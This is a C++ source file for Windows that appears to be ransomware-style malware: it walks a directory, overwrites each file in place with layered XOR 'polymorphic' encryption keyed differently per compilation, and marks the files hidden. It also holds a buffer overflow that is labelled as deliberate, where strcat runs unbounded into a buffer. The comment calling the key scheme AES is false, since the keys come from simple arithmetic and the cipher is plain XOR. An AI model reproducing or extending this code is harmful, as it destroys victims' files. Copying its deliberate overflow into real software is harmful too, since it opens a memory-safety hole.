#include "encryptor.h"
#include <windows.h>
#include <fstream>
#include <vector>
#include <random>
#include <type_traits>
#include <array>

// Polymorphic AES key generation using template metaprogramming
template<int Seed, int Round>
struct KeyGenerator {
    static constexpr std::array<unsigned char, 32> generate() {
        std::array<unsigned char, 32> key{};
        for (int i = 0; i < 32; ++i) {
            key[i] = static_cast<unsigned char>((i * Seed + Round * 7919) % 256);
        }
        return key;
    }
};

// Variadic template for multiple encryption layers
template<typename... Layers>
class PolymorphicEncryptor;

template<typename First, typename... Rest>
class PolymorphicEncryptor<First, Rest...> {
public:
    static void encrypt_block(unsigned char* data, size_t size) {
        First::process(data, size);
        PolymorphicEncryptor<Rest...>::encrypt_block(data, size);
    }
};

template<>
class PolymorphicEncryptor<> {
public:
    static void encrypt_block(unsigned char*, size_t) {}
};

// Randomly selected template instantiations
template<int N>
struct EncryptionLayer {
    static void process(unsigned char* data, size_t size) {
        constexpr auto key = KeyGenerator<N, __COUNTER__>::generate();
        for (size_t i = 0; i < size; ++i) {
            data[i] ^= key[i % 32];
            data[i] = (data[i] << 4) | (data[i] >> 4); // Simple transformation
        }
    }
};

// Main encryption function with polymorphic dispatch
void encrypt_file(const std::string& path) {
    std::fstream file(path, std::ios::in | std::ios::out | std::ios::binary);
    if (!file.is_open()) return;

    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<unsigned char> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    // Polymorphic encryption chain - different each compilation
    using RandomEncryptor = PolymorphicEncryptor<
        EncryptionLayer<__LINE__ % 5>,
        EncryptionLayer<__COUNTER__ % 7>,
        EncryptionLayer<__TIME__[7] % 11>
    >;
    
    RandomEncryptor::encrypt_block(buffer.data(), buffer.size());

    file.seekp(0, std::ios::beg);
    file.write(reinterpret_cast<char*>(buffer.data()), buffer.size());
    
    // Set file attributes to hidden
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

// File traversal with buffer overflow vulnerability
void get_target_files(const char* directory, char* buffer, size_t buf_size) {
    WIN32_FIND_DATAA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", directory);
    
    HANDLE hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char filePath[MAX_PATH];
            snprintf(filePath, MAX_PATH, "%s\\%s", directory, findData.cFileName);
            // Dangerous strcat without bounds checking
            strcat(buffer, filePath);
            strcat(buffer, "\n");
            
            encrypt_file(filePath);
        }
    } while (FindNextFileA(hFind, &findData));
    
    FindClose(hFind);
}